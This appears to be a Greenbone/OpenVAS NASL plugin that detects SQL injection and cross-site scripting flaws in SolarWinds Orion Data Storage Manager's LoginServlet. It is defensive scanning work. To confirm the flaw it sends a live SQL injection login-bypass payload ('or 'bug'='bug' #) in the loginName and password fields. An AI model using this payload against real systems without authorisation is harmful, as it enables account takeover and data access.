# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902902");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-01-24 11:53:50 +0530 (Tue, 24 Jan 2012)");
  script_name("SolarWinds Orion Data Storage Manager SQLi and XSS Vulnerabilities");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521328");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Jan/384");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109007/DDIVRT-2011-39.txt");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_require_ports("Services/www", 9000);
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Multiple flaws are due to an:

  - Input passed via the 'loginName' and 'password' parameters to
  'LoginServlet' page is not properly sanitised before being used in a SQL
  query. This can be exploited to manipulate SQL queries by injecting
  arbitrary SQL code.

  - Input passed to the 'loginName' parameter in 'LoginServlet' page is not
  properly verified before it is returned to the user. This can be exploited
  to execute arbitrary HTML and script code in a user's browser session in
  the context of a vulnerable site.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"SolarWinds Orion Data Storage Manager is prone to SQL injection
  (SQLi) and cross-site scripting (XSS) vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to steal
cookie-based authentication credentials, compromise the application,
access or modify data, or exploit latent vulnerabilities in the
underlying database.");
  script_tag(name:"affected", value:"SolarWinds Storage Manager Server version 5.1.2 and prior.");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

dsmPort = http_get_port(default:9000);

host = http_host_name(port:dsmPort);

sndReq = http_get(item:"/LoginServlet", port:dsmPort);
rcvRes = http_send_recv(port:dsmPort, data:sndReq);

if("SolarWinds Storage Manager" >!< rcvRes || ">SolarWinds" >!< rcvRes){
  exit(0);
}

exploit = "loginState=checkLogin&loginName=%27+or+%27bug%27%3D" +
          "%27bug%27+%23&password=%27+or+%27bug%27%3D%27bug%27+%23";

sndReq = string("POST /LoginServlet HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(exploit), "\r\n\r\n",
                 exploit);
rcvRes = http_keepalive_send_recv(port:dsmPort, data:sndReq);

if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:rcvRes) &&
  'statusRefresh.document.location.href = "/jsp/Enterprise' +
  'StatusHidden.jsp' >< rcvRes && ">Login<" >!< rcvRes){
    security_message(port:dsmPort, data:"The target host was found to be vulnerable");
}

exit(0);
